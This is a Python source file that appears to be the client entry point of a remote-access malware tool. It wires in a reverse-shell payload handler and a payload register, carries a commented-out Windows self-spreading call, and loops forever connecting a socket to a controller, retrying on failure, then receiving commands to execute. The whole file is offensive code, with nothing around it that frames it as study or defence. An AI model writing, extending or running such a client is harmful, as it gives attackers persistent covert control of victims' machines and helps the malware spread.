import time
from payloads.payload_register import payload_register
from payloads.spreading_handler import WindowsSpreadingHandler
from payloads.shell_payload_handler import ShellPayloadHandler
from client.client_handler import ClientHandler
from client import settings

try:
	# WindowsSpreadingHandler().spread(os.path.basename(sys.argv[0]))
	deps={
        "payload_register":payload_register,
        "ReverseShell":ShellPayloadHandler
	}
	ClientHandler.inject_dependencies(**deps)
	while True:
		c = ClientHandler()
		c.register_signal_handler()
		c.socket_create()
		while True:
			try:
				c.socket_connect()
			except Exception as e:
				print("Error on socket connections: %s" %str(e))
				time.sleep(settings.RETRY_TIME)
			else: 
				break
				       
		try:
			c.receive_commands()
		except Exception as e:
			print('Error in main: ' + str(e))
		c.socket.close()
except Exception as e:
	print("error {} exiting...".format(e))
